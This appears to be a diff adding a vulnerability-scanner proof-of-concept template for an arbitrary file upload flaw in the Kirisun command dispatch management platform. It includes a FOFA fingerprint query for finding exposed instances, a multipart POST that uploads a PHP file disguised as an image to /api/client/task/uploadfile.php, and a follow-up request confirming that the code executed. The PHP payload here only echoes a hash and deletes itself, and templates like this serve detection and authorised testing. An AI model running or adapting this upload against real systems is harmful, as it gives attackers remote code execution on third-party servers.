@@ -1,0 +1,47 @@
+id: poc-yaml-kirisun-uploadfile-anyfile-upload
+info:
+  name: 福建科立讯通信 指挥调度管理平台 uploadfile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 科立讯指挥调度管理平台
+  fofa: body="指挥调度管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/client/task/uploadfile.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
+  data: '------WebKitFormBoundary25qW4eG1Jt50iyf7
+
+    Content-Disposition: form-data; name="uuid"
+
+
+    1
+
+    ------WebKitFormBoundary25qW4eG1Jt50iyf7
+
+    Content-Disposition: form-data; name="number"
+
+
+    122
+
+    ------WebKitFormBoundary25qW4eG1Jt50iyf7
+
+    Content-Disposition: form-data; name="uploadfile";filename="{{.t1}}.php"
+
+    Content-Type: image/jpg
+
+
+    <?php echo md5({{.t1}}); unlink(__FILE__); ?>
+
+    ------WebKitFormBoundary25qW4eG1Jt50iyf7--'
+  expression: status_code == 200 && contains(body,".php") && contains(body,"successed")
+  output:
+  - regex_match(body,`/(?P<file>[a-z0-9-]+).php"`)
+- method: GET
+  path: /upload/task/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
